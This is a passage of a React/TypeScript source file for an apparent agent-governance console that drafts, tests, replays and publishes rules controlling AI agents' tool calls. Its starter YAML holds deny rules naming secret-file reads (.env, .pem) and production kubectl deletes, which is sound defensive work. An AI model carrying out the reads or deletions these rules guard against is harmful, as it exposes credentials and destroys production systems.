              <CodeBlock file="drafted rule" lang="yaml" code={toYaml([draft.rule!], 0).split("\n").slice(7).join("\n")} maxH={240} />
            ) : (
              <div className="grid h-full min-h-[160px] place-items-center rounded-xl border border-dashed border-line-strong p-4 text-center text-[12.5px] text-fg-3">
                The drafted rule will appear here once the sentence says what happens.
              </div>
            )}
          </div>
        </div>
      )}

      {!!draft.note && <div className="rounded-lg bg-review-soft px-3 py-2 text-[12px] text-review">{draft.note}</div>}

      <div className="flex flex-wrap items-center gap-2 border-t border-line pt-4">
        <Button variant="primary" onClick={onUse} disabled={!ready || drafting}>
          <Check className="size-3.5" /> Use this draft
        </Button>
        <span className="text-[12px] text-fg-3">Opens in the builder so you can check every field before it joins the contract.</span>
      </div>
    </div>
  );
}

function Section({ n, title, children }: { n: number; title: string; children: ReactNode }) {
  return (
    <div>
      <div className="flex items-center gap-2 mb-2.5">
        <span className="grid size-5 place-items-center rounded-full bg-ink text-ink-fg text-[10.5px] font-semibold">{n}</span>
        <span className="text-[13.5px] font-semibold">{title}</span>
      </div>
      {children}
    </div>
  );
}
function Labeled({ label, children }: { label: string; children: ReactNode }) {
  return (
    <div>
      <div className="text-[12px] font-medium text-fg-2 mb-1">{label}</div>
      {children}
    </div>
  );
}

/* ================= YAML editor ================= */
function YamlEditor({ initial, onApply, onCancel }: { initial: string; onApply: (rules: Rule[]) => void; onCancel: () => void }) {
  const [text, setText] = useState(initial);
  const [issues, setIssues] = useState<ParseIssue[]>([]);
  const lines = text.split("\n").length;
  return (
    <div className="rounded-xl bg-code border border-code-line overflow-hidden">
      <div className="flex items-center justify-between gap-2 px-3.5 h-10 border-b border-code-line">
        <span className="font-mono text-[12px] text-[#dde3f3]">wrapbox.yaml · editing</span>
        <div className="flex gap-1.5">
          <button onClick={onCancel} className="h-7 rounded-md px-2.5 text-[12px] text-[#a2acc5] hover:text-white">
            Cancel
          </button>
          <button
            onClick={() => {
              const r = fromYaml(text);
              setIssues(r.issues);
              if (!r.issues.length) onApply(r.rules);
            }}
            className="h-7 rounded-md bg-white px-3 text-[12px] font-semibold text-[#0f1b35]"
          >
            Validate & apply to draft
          </button>
        </div>
      </div>
      <div className="flex max-h-[520px] overflow-auto scroll-thin">
        <pre aria-hidden className="select-none py-3 pl-3 pr-3 text-right font-mono text-[12.5px] leading-[1.65] text-[#3c4764]">
          {Array.from({ length: lines }, (_, i) => (
            <span key={i} className={cn("block", issues.some((x) => x.line === i + 1) && "text-[#ff6e8a]")}>
              {i + 1}
            </span>
          ))}
        </pre>
        <textarea value={text} onChange={(e) => setText(e.target.value)} spellCheck={false} rows={lines + 1} className="flex-1 min-w-0 resize-none bg-transparent py-3 pr-3 font-mono text-[12.5px] leading-[1.65] text-[#dde3f3] outline-none" />
      </div>
      {issues.length > 0 ? (
        <div className="border-t border-code-line bg-[#2a1018] px-3.5 py-2.5 space-y-1">
          {issues.slice(0, 6).map((x, i) => (
            <div key={i} className="font-mono text-[11.5px] text-[#ff8fa3]">
              {x.line ? `line ${x.line}: ` : ""}
              {x.msg}
            </div>
          ))}
        </div>
      ) : (
        <div className="border-t border-code-line px-3.5 py-2 text-[11.5px] text-[#6c7692]">Effects: {EFFECTS.map((e) => e.id).join(" · ")}</div>
      )}
    </div>
  );
}

/* ================= Tester ================= */
function Tester({ rules }: { rules: Rule[] }) {
  const connected = useStore((s) => s.connected);
  const [agentId, setAgentId] = useState("claude-code");
  const [c, setC] = useState<Composed | null>(null);
  const v = c ? evaluate(c.act, rules, categoryOf(agentId)) : null;
  return (
    <Card>
      <CardHead title={<span className="flex items-center gap-2"><FlaskConical className="size-4 text-fg-2" />Test an action against your draft</span>} sub="Type what an agent would do. Deterministic — no model in the loop." />
      <div className="px-5 pb-5 space-y-3">
        <div className="flex flex-wrap gap-1.5">
          {["claude-code", "cursor", "stripe-mcp", "postgres-mcp", "langgraph", "agentforce", "browser-use", "openai-handoffs"].map((id) => {
            const a = agentById(id);
            return (
              <button key={id} onClick={() => setAgentId(id)} className={cn("flex items-center gap-1.5 rounded-full border h-7 pl-1 pr-2.5 text-[12px]", agentId === id ? "border-fg text-fg" : "border-line text-fg-2 hover:border-line-strong", !connected[id] && "opacity-70")}>
                <Logo name={a.logo} bleed={a.bleed} size={20} rounded="rounded-full" /> {a.name.split(" ")[0]}
              </button>
            );
          })}
        </div>
        <ActionComposer key={agentId} agentId={agentId} onChange={setC} />
        {v && <TraceView v={v} compact />}
      </div>
    </Card>
  );
}

function ReplayCard({ result, onRun, running, logSize }: { result: ReplayResult | null; onRun: () => void; running: boolean; logSize: number }) {
  return (
    <Card>
      <CardHead
        title={<span className="flex items-center gap-2"><History className="size-4 text-fg-2" />Replay recent traffic</span>}
        sub={logSize ? `Your draft vs. what's live, over the ${logSize.toLocaleString()} decisions in this workspace's log.` : "Your draft vs. what's live, over this workspace's decision log."}
        right={
          <Button size="sm" onClick={onRun} disabled={running || !logSize}>
            {running ? <Loader2 className="size-3.5 animate-spin" /> : null} Replay
          </Button>
        }
      />
      <div className="px-5 pb-5">
        {!logSize ? (
          <p className="text-[12.5px] text-fg-3">No decisions in the log yet — there is nothing to replay until agents act.</p>
        ) : !result ? (
          <p className="text-[12.5px] text-fg-3">Change a rule, then replay to see what would newly block before you publish.</p>
        ) : (
          <div className="space-y-3">
            <div className="grid grid-cols-3 gap-2">
              {[
                ["Newly blocked", result.newlyBlocked, "text-block"],
                ["Newly held / rewritten", result.newlyReview, "text-review"],
                ["Newly allowed", result.newlyAllowed, "text-allow"],
              ].map(([l, n, c]) => (
                <div key={l as string} className="rounded-xl border border-line p-3">
                  <div className="text-[11.5px] text-fg-3">{l}</div>
                  <div className={cn("text-[20px] font-semibold tnum", c as string)}>{(n as number).toLocaleString()}</div>
                </div>
              ))}
            </div>
            <div className="text-[12px] text-fg-3">
              {result.total.toLocaleString()} actions from the last {result.days} {result.days === 1 ? "day" : "days"} replayed · {result.changed.toLocaleString()} would change
            </div>
            {result.samples.length > 0 && (
              <ul className="space-y-1">
                {result.samples.map((s, i) => (
                  <li key={i} className="flex items-center gap-2 text-[12px]">
                    <span className="font-mono text-fg-2 w-[110px] shrink-0 truncate">{s.rule}</span>
                    <span className="font-mono text-fg-3 flex-1 min-w-0 truncate">{s.action}</span>
                    <DecisionPill d={s.from} size="sm" />
                    <span className="text-fg-3">→</span>
                    <DecisionPill d={s.to} size="sm" />
                  </li>
                ))}
              </ul>
            )}
          </div>
        )}
      </div>
    </Card>
  );
}

/** Every publish, newest first: who changed what, when. */
function ChangelogCard({ changelog }: { changelog: ContractChange[] }) {
  const [all, setAll] = useState(false);
  if (!changelog.length) return null;
  const items = [...changelog].reverse().slice(0, all ? undefined : 6);
  return (
    <Card className="overflow-hidden">
      <CardHead title="Version history" sub={`${changelog.length} ${changelog.length === 1 ? "publish" : "publishes"} · every change to the contract, by whom`} />
      <ul className="border-t border-line">
        {items.map((c) => {
          const p = personById(c.by);
          return (
            <li key={c.version} className="flex items-start gap-3 px-5 py-3 border-b border-line last:border-0">
              <span className="font-mono text-[11.5px] text-fg-3 w-8 shrink-0 pt-0.5 tnum">v{c.version}</span>
              <div className="min-w-0 flex-1">
                <div className="text-[12.5px]">{c.summary}</div>
                <div className="mt-0.5 flex flex-wrap items-center gap-x-2.5 gap-y-1 text-[11px] text-fg-3">
                  {p && (
                    <span className="inline-flex items-center gap-1">
                      <Avatar p={p} size={14} /> {p.name}
                    </span>
                  )}
                  <span>{ago(c.at)}</span>
                  {c.added.length > 0 && <span className="font-mono text-allow">+{c.added.length}</span>}
                  {c.changed.length > 0 && <span className="font-mono text-constrain">~{c.changed.length}</span>}
                  {c.removed.length > 0 && <span className="font-mono text-block">−{c.removed.length}</span>}
                </div>
              </div>
            </li>
          );
        })}
      </ul>
      {changelog.length > 6 && (
        <button onClick={() => setAll(!all)} className="w-full px-5 py-2.5 text-left text-[12px] text-fg-3 hover:text-fg border-t border-line">
          {all ? "Show recent only" : `Show all ${changelog.length} versions`}
        </button>
      )}
    </Card>
  );
}

/* ================= Publish ================= */
const HOW: Record<string, string> = {
  claude: "managed settings · PreToolUse hook",
  codex: "~/.codex/hooks.json · policy cache",
  cursor: ".cursor/hooks.json · wrapbox CLI cache",
  copilot: ".github/hooks · wrapbox CLI cache",
  gemini: "BeforeTool hook · policy cache",
  runtime: "endpoint runtime · hot reload",
  mcp: "MCP gateway · hot reload",
  "sdk-ts": "@wrapbox/sdk · policy cache refreshed",
  "sdk-py": "wrapbox (py) · policy cache refreshed",
  adk: "before_tool_callback · cache refreshed",
  cloud: "task tokens reissued",
  connector: "connector action · live",
  browser: "controlled executor · reloaded",
  a2a: "A2A gateway · delegation tokens reissued",
  windsurf: ".windsurf/hooks.json · policy cache",
  cline: ".clinerules/hooks · policy cache",
  opencode: ".opencode/plugins · policy cache",
  droid: ".factory/hooks.json · policy cache",
  kiro: ".kiro/agents · policy cache",
  auggie: "~/.augment/settings.json · policy cache",
};

function PublishModal({ open, onClose, version }: { open: boolean; onClose: () => void; version: number }) {
  const connected = useStore((s) => s.connected);
  const ids = Object.keys(connected);
  const [n, setN] = useState(0);
  useEffect(() => {
    if (!open) return;
    setN(0);
    const t = setInterval(() => setN((x) => (x >= ids.length ? x : x + 1)), 170);
    return () => clearInterval(t);
  }, [open, ids.length]);
  return (
    <Modal open={open} onClose={onClose} width={560}>
      <div className="p-6">
        <div className="flex items-center gap-2">
          <Rocket className="size-4 text-accent" />
          <div className="text-[15px] font-semibold">Contract v{version} is live</div>
        </div>
        <p className="mt-1 text-[12.5px] text-fg-3">Each connected agent receives the same rules in the form it understands.</p>
        {ids.length ? (
          <ul className="mt-4 max-h-[340px] overflow-y-auto scroll-thin divide-y divide-line rounded-xl border border-line">
            {ids.map((id, i) => {
              const a = agentById(id);
              const done = i < n;
              return (
                <li key={id} className="flex items-center gap-3 px-3.5 py-2.5">
                  <Logo name={a.logo} bleed={a.bleed} size={22} rounded="rounded-md" />
                  <div className="min-w-0 flex-1">
                    <div className="text-[12.5px] font-medium truncate">{a.name}</div>
                    <div className="font-mono text-[11px] text-fg-3 truncate">{HOW[a.adapter]}</div>
                  </div>
                  {done ? (
                    <span className="flex items-center gap-1 text-[11.5px] text-allow">
                      <Check className="size-3.5" /> {40 + ((i * 53) % 180)} ms
                    </span>
                  ) : (
                    <Loader2 className="size-3.5 animate-spin text-fg-3" />
                  )}
                </li>
              );
            })}
          </ul>
        ) : (
          <div className="mt-4 rounded-xl border border-dashed border-line-strong px-4 py-5 text-[12.5px] text-fg-2">No agents are connected yet, so there's nothing to push. The contract applies the moment you connect one.</div>
        )}
        <div className="mt-4 flex items-center justify-between">
          <span className="text-[12px] text-fg-3">
            {Math.min(n, ids.length)} of {ids.length} agents updated
          </span>
          <Button variant="primary" disabled={n < ids.length} onClick={onClose}>
            Done
          </Button>
        </div>
      </div>
    </Modal>
  );
}

/* ================= Page ================= */
const STARTER = `version: 1
org: wrapbox
default: ALLOW

rules:
  - id: secrets.read
    title: "Secret files are never read autonomously"
    when:
      effect: filesystem.read
      path: ["**/.env*", "**/*.pem"]
    decision: BLOCK

  - id: prod.deletes
    title: "Production deletes need the on-call engineer"
    when:
      effect: shell.exec
      command: ["kubectl delete * -n prod*"]
    decision: REVIEW
    approvers: oncall-sre
`;

/**
 * The YAML pane in v2 is a read-only projection of the live Control Plane ruleset, not the
 * file the runtime pulls. toYaml() only knows the in-browser simulator — default ALLOW and our
 * effect vocabulary — while the Control Plane the v2 fleet actually runs is fail-closed (no match
 * → BLOCK) and matches on each rule's own condition. We can't change toYaml() from this file, so
 * correct the rendered text here rather than assert a security posture the devices don't enforce.
 */
function cpRenderedYaml(src: string): string {
  return src
    .replace(/^# One contract for every agent in the org$/m, "# Read-only view of the live Control Plane ruleset — this build reads it, it does not author it.")
    .replace(/^default: ALLOW$/m, "default: BLOCK   # fail-closed — an action matching no rule is blocked")
    .replace(/^(\s*)effect: \["policy\.\*"\]$/gm, '$1effect: "*"   # every tool call — the Control Plane evaluates the rule condition, not this effect')
    .replace("# empty — every action is allowed by default", "# empty — with no rules, enrolled devices block every intermediated action (fail-closed)");
}

export function ContractPage({ query }: { query: URLSearchParams }) {
  const role = useStore((s) => s.role);
  const rules = useStore((s) => s.rules);
  const published = useStore((s) => s.published);
  const version = useStore((s) => s.version);
  const publishedAt = useStore((s) => s.publishedAt);
  const changelog = useStore((s) => s.changelog);
  const events = useStore((s) => s.events);
  const { labs } = useWorkspace();
  // v2 is the live Control-Plane-backed product. The CP client (cp-api.ts) is GET-only — there is
  // no write path — and cp-sync overwrites `rules`/`published` from the CP every 5 s, so nothing
  // authored here can reach a device or even survive locally. Authoring is therefore read-only in
  // v2 and this page renders the CP ruleset. The simulated workspaces (fabric/fresh) keep the full
  // author → publish → simulated-fleet flow, where those claims are true.
  const cpBacked = useStore((s) => s.workspace) === "v2";
  const publisher = changelog.length ? personById(changelog[changelog.length - 1].by) : undefined;
  const [view, setView] = useState<"visual" | "yaml">("visual");
  const [editingYaml, setEditingYaml] = useState(false);
  const [rep, setRep] = useState<ReplayResult | null>(null);
  const [running, setRunning] = useState(false);
  const [pub, setPub] = useState(false);
  const [builder, setBuilder] = useState<{ open: boolean; rule: Rule | null; mode?: BuildMode }>({ open: false, rule: null });
  const readOnly = role === "employee";

  const suggest = query.get("suggest");
  const from = query.get("from");
  useEffect(() => {
    // No authoring in v2: the CP is read-only, so a ?suggest / ?from deep link must not open the builder.
    if (readOnly || cpBacked) return;
    let act: Act | undefined;
    if (suggest && ACTS[suggest]) act = ACTS[suggest];
    if (from) {
      try {
        act = JSON.parse(decodeURIComponent(from));
      } catch {
        /* ignore malformed input */
      }
    }
    if (act) setBuilder({ open: true, rule: ruleFromAct(act) });
  }, [suggest, from, readOnly, cpBacked]);

  const pubMap = useMemo(() => new Map(published.map((r) => [r.id, ruleSig(r)])), [published]);
  const dirtyIds = rules.filter((r) => pubMap.get(r.id) !== ruleSig(r)).map((r) => r.id);
  const removed = published.filter((p) => !rules.some((r) => r.id === p.id)).length;
  const changes = dirtyIds.length + removed;
  const shown = readOnly ? published.filter((r) => r.scope !== "business") : rules;
  const rawYaml = toYaml(readOnly ? shown : rules, changes ? version + 1 : version, orgSlugOf(storeState().domain, storeState().company));
  const yaml = cpBacked ? cpRenderedYaml(rawYaml) : rawYaml;

  const update = (r: Rule) => setState((s) => ({ rules: s.rules.map((x) => (x.id === r.id ? r : x)) }));
  const remove = (id: string) => {
    setState((s) => ({ rules: s.rules.filter((x) => x.id !== id) }));
    toast("Rule removed from draft", "Publish to apply", "review");
  };
  const saveRule = (r: Rule) => {
    setState((s) => ({ rules: s.rules.some((x) => x.id === r.id) ? s.rules.map((x) => (x.id === r.id ? r : x)) : [...s.rules, r] }));
    setBuilder({ open: false, rule: null });
    toast(`Rule “${r.id}” saved to draft`, `Publish v${version + 1} to enforce it`, "allow");
  };
  const publish = () => {
    // No write path to the Control Plane in v2 — publishing is disabled and unreachable there.
    if (cpBacked) return;
    publishContract();
    setPub(true);
  };
  const empty = !readOnly && rules.length === 0;

  return (
    <div className="mx-auto max-w-[1320px] px-4 lg:px-8 py-8">
      <PageHeader
        eyebrow={readOnly ? "Managed by your admin" : cpBacked ? "Live Control Plane · read-only" : "wrapbox.yaml"}
        title={readOnly ? "Rules for me" : "Intent contract"}
        sub={
          readOnly
            ? "These rules decide what your agents may do. You can read them — only admins change them. If something you need is blocked, request an exception."
            : cpBacked
              ? "The ruleset the Control Plane holds for your org, rendered read-only. This build reads it — it has no write path, so rules are created and changed on the Control Plane, not here. Enrolled devices enforce the ruleset they last pulled; an action matching no rule is blocked (fail closed)."
              : `Write what agents may do — once, in one vocabulary of effects. Build rules visually or type YAML, test any action against your draft, then publish. ${labs ? "Flows, the playground and live traffic" : "Every connected agent"} follow${labs ? "" : "s"} the published version.`
        }
        right={
          <>
            {!cpBacked && <Chip>{version ? `v${version} · published ${ago(publishedAt)}${publisher ? ` by ${publisher.name.split(" ")[0]}` : ""}` : "not published yet"}</Chip>}
            {!readOnly && !cpBacked && (
              <>
                {changes > 0 && (
                  <Button variant="ghost" size="sm" onClick={() => setState((s) => ({ rules: s.published }))}>
                    <Undo2 className="size-3.5" /> Discard
                  </Button>
                )}
                <Button variant="primary" disabled={!changes} onClick={publish}>
                  <Rocket className="size-3.5" /> Publish v{version + 1}
                  {changes > 0 && <span className="ml-1 rounded-full bg-white/20 px-1.5 text-[11px]">{changes}</span>}
                </Button>
              </>
            )}
            {!readOnly && cpBacked && (
              <Chip>
                <Lock className="size-3" /> read-only · Control Plane
              </Chip>
            )}
            {readOnly && (
              <Chip>
                <Lock className="size-3" /> read-only
              </Chip>
            )}
          </>
        }
      />

      {!readOnly && cpBacked && (
        <div className="mb-4 flex flex-wrap items-center gap-2">
          <span className="text-[12px] text-fg-3">Rules are authored on the Control Plane. This build only reads them — it has no write path, so there is nothing to draft or publish here.</span>
          <div className="ml-auto xl:hidden">
            <Segmented
              size="sm"
              value={view}
              onChange={setView}
              options={[
                { value: "visual", label: "Visual" },
                { value: "yaml", label: "YAML" },
              ]}
            />
          </div>
        </div>
      )}

      {!readOnly && !cpBacked && (
        <div className="mb-4 flex flex-wrap items-center gap-2">
          <Button variant="primary" onClick={() => setBuilder({ open: true, rule: null, mode: "describe" })}>
            <Wand2 className="size-3.5" /> Describe a rule
          </Button>
          <Button onClick={() => setBuilder({ open: true, rule: null, mode: "build" })}>
            <Plus className="size-3.5" /> Build a rule
          </Button>
          <Button
            onClick={() => {
              setEditingYaml(true);
              setView("yaml");
            }}
          >
            <Pencil className="size-3.5" /> Write YAML
          </Button>
          {rules.some((r) => r.mode === "observe") && (
            <Button
              onClick={() => {
                setState((s) => ({ rules: s.rules.map((r) => ({ ...r, mode: undefined })) }));
                toast("All rules switched to enforce", "Publish to start stopping actions", "review");
              }}
            >
              Enforce all rules
            </Button>
          )}
          <span className="ml-auto text-[12px] text-fg-3">{changes ? `${changes} unpublished change${changes > 1 ? "s" : ""} — agents still follow v${version}` : `Draft matches v${version}`}</span>
          <div className="xl:hidden">
            <Segmented
              size="sm"
              value={view}
              onChange={setView}
              options={[
                { value: "visual", label: "Visual" },
                { value: "yaml", label: "YAML" },
              ]}
            />
          </div>
        </div>
      )}

      {empty ? (
        <Card className="p-8">
          <div className="max-w-[640px]">
            {cpBacked ? (
              <>
                <div className="eyebrow">No rules on the Control Plane</div>
                <h2 className="mt-2 text-[22px] font-semibold">No rules published to the Control Plane yet.</h2>
                <p className="mt-2 text-[13.5px] text-fg-2 leading-relaxed">
                  This does not mean agents are unrestricted. Every enrolled device enforces the ruleset it last pulled, and the endpoint runtime blocks any action no rule matches (fail closed) — with no rules, an enrolled device denies tool calls rather than allowing them, and denies outright when its cached policy is missing or stale. Machines with no Wrapbox runtime installed are not intermediated at all. This build reads the ruleset from the Control Plane; it has no write path to author rules here.
                </p>
              </>
            ) : (
              <>
                <div className="eyebrow">Empty contract</div>
                <h2 className="mt-2 text-[22px] font-semibold">Right now every agent action is allowed.</h2>
                <p className="mt-2 text-[13.5px] text-fg-2 leading-relaxed">Describe a rule in plain English, build one field by field, or type YAML. Nothing is enforced until you publish.</p>
                <div className="mt-5 flex flex-wrap gap-2">
                  <Button variant="primary" onClick={() => setBuilder({ open: true, rule: null, mode: "describe" })}>
                    <Wand2 className="size-3.5" /> Describe a rule
                  </Button>
                  <Button onClick={() => setBuilder({ open: true, rule: null, mode: "build" })}>
                    <Plus className="size-3.5" /> Build a rule
                  </Button>
                  <Button onClick={() => setEditingYaml(true)}>
                    <Pencil className="size-3.5" /> Write YAML
                  </Button>
                </div>
              </>
            )}
          </div>
          {!cpBacked && editingYaml && (
            <div className="mt-6">
              <YamlEditor
                initial={STARTER}
                onCancel={() => setEditingYaml(false)}
                onApply={(r) => {
                  setState({ rules: r });
                  setEditingYaml(false);
                  toast(`${r.length} rule${r.length === 1 ? "" : "s"} parsed`, "Added to draft — publish to enforce", "allow");
                }}
              />
            </div>
          )}
        </Card>
      ) : (
        <div className="grid gap-5 xl:grid-cols-[minmax(0,1.05fr)_minmax(0,0.95fr)]">
          <div className={cn("space-y-5 min-w-0", view === "yaml" && "hidden xl:block")}>
            <Card className="overflow-hidden">
              <CardHead
                title={`${shown.length} rules`}
                sub={readOnly ? "Coding-agent and org-wide rules that apply to you" : cpBacked ? "Highest-priority matching rule wins · default BLOCK (fail closed)" : "Most restrictive matching rule wins · default ALLOW"}
                right={<span className="font-mono text-[11px] text-fg-3">{cpBacked ? "default: BLOCK" : "default: ALLOW"}</span>}
              />
              <div className="border-t border-line">
                <AnimatePresence initial={false}>
                  {shown.map((r) => (
                    <motion.div key={r.id} layout="position" initial={{ opacity: 0, y: -4 }} animate={{ opacity: 1, y: 0 }} exit={{ opacity: 0 }}>
                      <RuleRow rule={r} onChange={update} onEdit={() => setBuilder({ open: true, rule: r })} onDelete={() => remove(r.id)} readOnly={readOnly || cpBacked} dirty={!readOnly && !cpBacked && dirtyIds.includes(r.id)} />
                    </motion.div>
                  ))}
                </AnimatePresence>
              </div>
            </Card>
          </div>
          <div className={cn("space-y-5 min-w-0", view === "visual" && "hidden xl:block")}>
            {editingYaml && !readOnly && !cpBacked ? (
              <YamlEditor
                initial={toYaml(rules, version + 1, orgSlugOf(storeState().domain, storeState().company))}
                onCancel={() => setEditingYaml(false)}
                onApply={(r) => {
                  setState({ rules: r });
                  setEditingYaml(false);
                  toast("YAML applied to draft", `${r.length} rules · publish to enforce`, "allow");
                }}
              />
            ) : (
              <CodeBlock
                file="wrapbox.yaml"
                note={readOnly ? "read-only" : cpBacked ? "rendered view" : changes ? "draft" : "live"}
                lang="yaml"
                code={yaml}
                numbers
                maxH={readOnly ? 640 : 400}
                right={
                  !readOnly && !cpBacked && (
                    <button onClick={() => setEditingYaml(true)} className="inline-flex items-center gap-1 rounded-md px-2 h-6 text-[11.5px] text-[#8a95b3] hover:text-white">
                      <Pencil className="size-3" /> Edit
                    </button>
                  )
                }
              />
            )}
            {!readOnly && cpBacked && (
              <Card>
                <CardHead
                  title={<span className="flex items-center gap-2"><FlaskConical className="size-4 text-fg-2" />Testing & replay run on the Control Plane</span>}
                  sub="Not available in this build against a live Control Plane."
                />
                <div className="px-5 pb-5 text-[12.5px] text-fg-3 leading-relaxed">
                  Rules synced from the Control Plane match on conditions the endpoint runtime evaluates on the device, not in this browser — so a draft tester or a pre-publish replay here would fall through to ALLOW and misstate what your fleet enforces (which is fail-closed: an action matching no rule is blocked). Author, test and replay run against the Control Plane and its enrolled devices, not this read-only console.
                </div>
              </Card>
            )}
            {!readOnly && !cpBacked && (
              <>
                <Tester rules={rules} />
                <ReplayCard
                  result={rep}
                  running={running}
                  logSize={events.length}
                  onRun={() => {
                    setRunning(true);
                    setTimeout(() => {
                      setRep(replayLog(rules, published, events, categoryOf));
                      setRunning(false);
                    }, 250);
                  }}
                />
                <ChangelogCard changelog={changelog} />
              </>
            )}
          </div>
        </div>
      )}

      <RuleBuilder open={builder.open} initial={builder.rule} startMode={builder.mode ?? "build"} existingIds={rules.map((r) => r.id)} onClose={() => setBuilder({ open: false, rule: null })} onSave={saveRule} />
      <PublishModal
        open={pub}
        version={version}
        onClose={() => {
          setPub(false);
          toast(`Contract v${version} is live`, labs ? "Flows, the playground and live traffic now follow it." : "Every connected agent now follows it.", "allow");
        }}
      />
    </div>
  );
}
